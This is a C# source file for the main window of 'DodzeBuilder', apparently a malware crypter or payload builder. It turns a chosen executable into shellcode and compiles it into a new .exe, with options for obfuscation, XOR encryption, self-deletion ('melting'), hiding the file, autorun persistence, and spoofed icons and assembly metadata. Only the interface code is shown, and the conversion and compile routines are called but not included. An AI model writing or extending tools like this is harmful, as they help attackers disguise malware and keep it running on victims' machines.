using DodzeBuilder.DodzeAlgorithms;
using MetroFramework.Forms;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace DodzeBuilder
{
    public partial class DodzeMain : MetroForm
    {
        private string AssemblyFile;
        private string IconFile;

        public DodzeMain()
        {
            InitializeComponent();
        }

        #region BtnEvents
        private void BuildBtn_Click(object sender, EventArgs e)
        {
            string FilePath = FilePathBox.Text;

            bool
                UseObfuscate = ObfuscateChk.Checked,
                UseMelting = MeltFileChk.Checked,
                UseHideFile = HideFileChk.Checked,
                UseAutorun = AutorunChk.Checked;

            if (string.IsNullOrEmpty(FilePath) || !File.Exists(FilePath))
            {
                MessageBox.Show("Target file cannot be exists!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save output file - D O D Z E";
                save.Filter = "*.EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    string convertResult = ShellcodeConverter.Run(FilePath);

                    if (File.Exists(convertResult))
                    {

                        string resultCompile = Compilator.PerformCompilate(convertResult, save.FileName, IconFile, AssemblyFile,
                           UseObfuscate, UseAutorun, UseMelting, UseAutorun);

                        MessageBox.Show(resultCompile, "Build Information:", MessageBoxButtons.OK, MessageBoxIcon.Information); return;

                    }
                    else { MessageBox.Show($"Error:\n{convertResult}", "Build attempt failed", MessageBoxButtons.OK, MessageBoxIcon.Information); }
                }
            }
        }

        private void SelectFileBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select *.exe file - D O D Z E";
                open.Filter = "*.EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    FilePathBox.Text = open.FileName;
                }
            }
        }
        private void FilePathBox_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
            }
            else
            {
                e.Effect = DragDropEffects.None;
            }
        }

        private void FilePathBox_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string filePath = files[0];
                    string fileExtension = Path.GetExtension(filePath);

                    if (fileExtension.Equals(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        FilePathBox.Text = filePath;
                    }
                    else
                    {
                        MessageBox.Show("Only .exe files!", "Error format file", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
        }

        private void SelectIconBtn_Click(object sender, EventArgs e)
        {
            string iconsDirectory = Path.Combine(Directory.GetCurrentDirectory(), "Icons");
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Open *.ico file - D O D Z E ";
                open.Filter = "ICO (*.ico)|*.ico";

                if (Directory.Exists(iconsDirectory))
                {
                    open.InitialDirectory = iconsDirectory;
                }

                if (open.ShowDialog() == DialogResult.OK)
                {
                    IconFile = open.FileName;
                    IconBox.Image = Image.FromFile(open.FileName);
                }

            }
        }

        private void SelectAssemblyBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select any *.exe file - D O D Z E";
                open.Filter = "EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    string
                        tempFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.assembly"),
                        result = AssemblyChanger.Run(open.FileName, tempFile);

                    if (File.Exists(result))
                    {
                        AssemblyFile = result;
                    }
                    else
                    {
                        AssemblyFile = null;
                        MessageBox.Show($"Error: {result}");
                    }
                }
            }
        }
        #endregion

        #region About Form & Btn Events

        private void AuthorLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void GitLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void DnlibLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/0xd4d/dnlib");
        }

        private void MetroFrameworkLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/thielj/MetroFramework");
        }

        private void DonutLabel_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/TheWover/donut");
        }
        #endregion

        #region Timers & Form initializtion
        private void XorKeygeneration_Tick(object sender, EventArgs e)
        {
            XorKeygen.Text = XorEncryptor.GenerateStrBytes(32);
        }

        private void DodzeMain_Load(object sender, EventArgs e)
        {
            XorKeygeneration.Start();
        }
        #endregion

    }
}
